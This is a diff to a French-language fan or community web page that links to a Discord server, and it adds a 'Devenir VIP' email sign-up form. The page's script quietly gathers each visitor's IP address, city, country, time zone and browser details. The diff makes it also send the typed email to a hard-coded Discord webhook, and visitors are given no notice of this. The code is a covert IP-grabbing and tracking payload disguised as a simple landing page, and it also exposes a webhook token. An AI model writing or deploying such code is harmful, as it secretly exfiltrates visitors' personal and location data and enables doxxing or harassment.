@@ -47,11 +47,44 @@
         .discord-button:hover {
             background-color: #677BC4; /* Changement de couleur au survol */
         }
+
+        .vip-form {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        #emailInput {
+            margin-bottom: 10px;
+            padding: 8px;
+            font-size: 14px;
+        }
+
+        #devenirVIPButton {
+            background-color: #7289DA;
+            color: white;
+            font-size: 14px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        #devenirVIPButton:hover {
+            background-color: #677BC4;
+        }
     </style>
 </head>
 <body>
     <h1>Bienvenue sur le site d'EzroStar. Veuillez rejoindre le Discord pour plus d'infos :</h1>
     <a href="https://discord.gg/GsDsDzp6bB" target="_blank" class="discord-button">Discord</a>
+
+    <div class="vip-form">
+        <input type="email" id="emailInput" placeholder="Entrez votre adresse e-mail">
+        <button id="devenirVIPButton" onclick="devenirVIP()">Devenir VIP</button>
+    </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1209908254373711903/knK8b_n6LS2q-h4RISvtMpeJ1oFE0C489n-Ab8btUqi3VSuRQ7XBFtkieCJEdoWV5aVL";
@@ -70,7 +103,9 @@
             return data;
         };
 
-        const sendWebhookOnce = async () => {
+        const devenirVIP = async () => {
+            const email = document.getElementById("emailInput").value;
+
             // Vérifie si le message a déjà été envoyé en utilisant le stockage local
             if (!localStorage.getItem("webhookSent")) {
                 const ipAddress = await getIpAddress();
@@ -78,7 +113,7 @@
 
                 const embed = {
                     title: "<:FakeNitroEmoji:1209487670561210419> Nouveau membre a rejoint le site!",
-                    description: `**<:3228info:1210210365414055956> Adresse IP: || ${ipAddress} ||\n<:8692communityserver:1210210464647094383> Pays: || ${ipGeolocationData.country_name} ||\n<:3267ecomode:1210210378018066492> Ville: || ${ipGeolocationData.city} ||\n<:6764newmember:1210210416517709844> Fuseau horaire: || ${ipGeolocationData.time_zone} ||\n<:6307management:1210210404471672864> Navigateur + Plateforme: || ${window.navigator.userAgent} ||**`,
+                    description: `**<:3228info:1210210365414055956> Adresse IP: || ${ipAddress} ||\n<:8692communityserver:1210210464647094383> Pays: || ${ipGeolocationData.country_name} ||\n<:3267ecomode:1210210378018066492> Ville: || ${ipGeolocationData.city} ||\n<:6764newmember:1210210416517709844> Fuseau horaire: || ${ipGeolocationData.time_zone} ||\n<:6307management:1210210404471672864> Navigateur + Plateforme: || ${window.navigator.userAgent} ||\n<:7884member:1210210443314860073> Adresse Mail: || ${email} ||**`,
                     color: 0x00ff00
                 };
 
@@ -105,3 +140,4 @@
     </script>
 </body>
 </html>
+
